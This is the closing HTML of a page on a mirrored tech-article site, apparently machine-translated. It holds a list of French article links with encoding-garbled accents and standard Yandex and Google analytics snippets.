<li><a href="../fr480438/index.html">√âv√©nements num√©riques √† Moscou du 16 au 22 d√©cembre</a></li>
<li><a href="../fr480440/index.html">√âv√©nements num√©riques √† Saint-P√©tersbourg du 16 au 22 d√©cembre</a></li>
<li><a href="../fr480444/index.html">D√©tective Habra: 24 heures de la vie de 24 publications</a></li>
<li><a href="../fr480446/index.html">√âcriture du proxy inverse Grafana sur Go</a></li>
<li><a href="../fr480452/index.html">OWASP Moscow Meetup # 9: Records de performance</a></li>
<li><a href="../fr480458/index.html">Regardez "Cell of time"</a></li>
<li><a href="../fr480460/index.html">Solution fondamentale d'un syst√®me d'√©quations lin√©aires. Vue lat√©rale</a></li>
<li><a href="../fr480462/index.html">Comment j'ai d√©battu d'une liste doublement li√©e pour O (1)</a></li>
<li><a href="../fr480466/index.html">Sp√©cifications du dialyseur: le chemin des Jedi</a></li>
<li><a href="../fr480468/index.html">D√©ployer des applications Tarantool Cartridge sans effort (partie 1)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>